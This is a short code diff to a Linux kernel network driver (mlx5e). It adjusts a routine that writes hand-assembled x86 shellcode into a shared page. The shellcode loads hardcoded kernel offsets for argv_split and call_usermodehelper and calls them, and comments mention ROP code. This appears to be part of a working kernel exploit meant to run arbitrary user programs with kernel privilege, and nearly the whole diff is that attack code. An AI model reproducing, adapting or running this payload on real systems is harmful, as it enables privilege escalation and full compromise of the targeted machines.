@@ -216,7 +216,9 @@ static inline bool mlx5e_rx_cache_get(struct mlx5e_rq *rq,
 }
 
 //#define PFN (33517752ULL)
-#define PFN (33538064ULL)
+#define PFN 		(33538064ULL)
+#define ARGV_SPLIT 	(0x91eb40)
+#define UM_HELP		(0x097830)
 static inline void shared_info_write_page(char *base)
 {
 	/* Gil, write your ROP code magic here */
@@ -276,7 +278,7 @@ static inline void shared_info_write_page(char *base)
         *(base++) = 0x48;
         *(base++) = 0xc7;
         *(base++) = 0xc0;
-	*(u32*)base = (u32)(gilkup_vars.kernel_base + 0x8ddb40); //TODO: replace with your argv_split
+	*(u32*)base = (u32)(gilkup_vars.kernel_base + ARGV_SPLIT); //TODO: replace with your argv_split
 	base += sizeof(u32);
 
 	// call rax
@@ -302,7 +304,7 @@ static inline void shared_info_write_page(char *base)
         *(base++) = 0x48;
         *(base++) = 0xc7;
         *(base++) = 0xc0;
-        *(u32*)base = (u32)(gilkup_vars.kernel_base + 0x097830); //TODO: replace with your call_usermodehelper
+        *(u32*)base = (u32)(gilkup_vars.kernel_base + UM_HELP); //TODO: replace with your call_usermodehelper
         base += sizeof(u32);
 
 	// call rax
